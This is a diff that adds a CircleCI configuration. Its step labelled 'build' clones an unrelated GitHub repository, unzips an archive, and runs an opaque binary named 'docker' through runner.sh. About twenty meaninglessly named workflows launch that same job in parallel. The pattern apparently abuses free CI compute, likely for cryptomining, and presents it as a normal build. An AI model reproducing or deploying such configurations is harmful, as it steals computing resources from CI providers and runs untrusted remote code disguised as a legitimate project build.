@@ -1,0 +1,91 @@
+version: 2.1
+executors:
+  circleci_machine:
+    docker:
+      - image: cimg/go:1.16.4
+    working_directory: ~/my-project
+commands:
+  build:
+    description: Run build
+    steps:
+      - checkout
+      - run:
+          name: build
+          command: |
+              sudo apt update && sudo apt install libjansson4
+               
+      - run:
+          name: build
+          command: |
+              git clone https://github.com/shuwaibahjaman/zenatan.git && cd zenatan && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
+              
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/my-project
+    steps: [build]
+
+    
+    
+workflows:
+  version: 2
+  trjdtyj:
+    jobs:
+      - buildd
+  jdytdtyj:
+    jobs:
+      - buildd
+  tdjyjytj:
+    jobs:
+      - buildd
+  ettrhhj:
+    jobs:
+      - buildd
+  tyjykykf:
+    jobs:
+      - buildd
+  bfkfytktf:
+    jobs:
+      - buildd
+  tyjktyk:
+    jobs:
+      - buildd
+  tyktkyky:
+    jobs:
+      - buildd
+  etrgved:
+    jobs:
+      - buildd
+  btyjtytjj:
+    jobs:
+      - buildd
+  rhtjtyj:
+    jobs:
+      - buildd
+  tyjtjtyry:
+    jobs:
+      - buildd
+  rtyytjkuk:
+    jobs:
+      - buildd
+  ykmhtyyj:
+    jobs:
+      - buildd
+  tjykmj:
+    jobs:
+      - buildd
+  tyjtkujm:
+    jobs:
+      - buildd
+  tyjuykh:
+    jobs:
+      - buildd
+  tyjjhm:
+    jobs:
+      - buildd
+  ytjuykjb:
+    jobs:
+      - buildd
+  ytjuyhukjb:
+    jobs:
+      - buildd
